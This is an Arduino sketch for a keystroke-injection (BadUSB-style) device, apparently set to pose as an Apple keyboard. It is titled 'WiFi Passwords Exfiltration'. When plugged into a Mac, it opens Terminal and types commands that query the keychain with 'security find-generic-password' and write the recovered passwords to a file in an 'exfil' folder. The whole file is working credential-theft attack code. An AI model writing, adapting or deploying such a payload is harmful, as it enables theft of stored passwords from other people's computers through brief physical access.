#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Extract saved WiFi passwords from System Keychain
  // Saves to ~/wifi_passwords.txt
  // Author: Generated
  // Title: WiFi Passwords Exfiltration
  // Target: macOS
  // Version: 1.0
  // Category: Credentials
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("mkdir -p ~/Documents/exfil");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("networksetup -listallnetworkservices > ~/Documents/exfil/wifi_ssids.txt");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("for network in $(networksetup -listallnetworkservices | grep -v '*'); do password=$(security find-generic-password -wa \"$network\" 2>/dev/null); echo \"$network: $password\" >> ~/Documents/exfil/wifi_passwords.txt; done");

  typeKey(KEY_RETURN);

  delay(3000);

  Keyboard.print("cat ~/Documents/exfil/wifi_passwords.txt");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}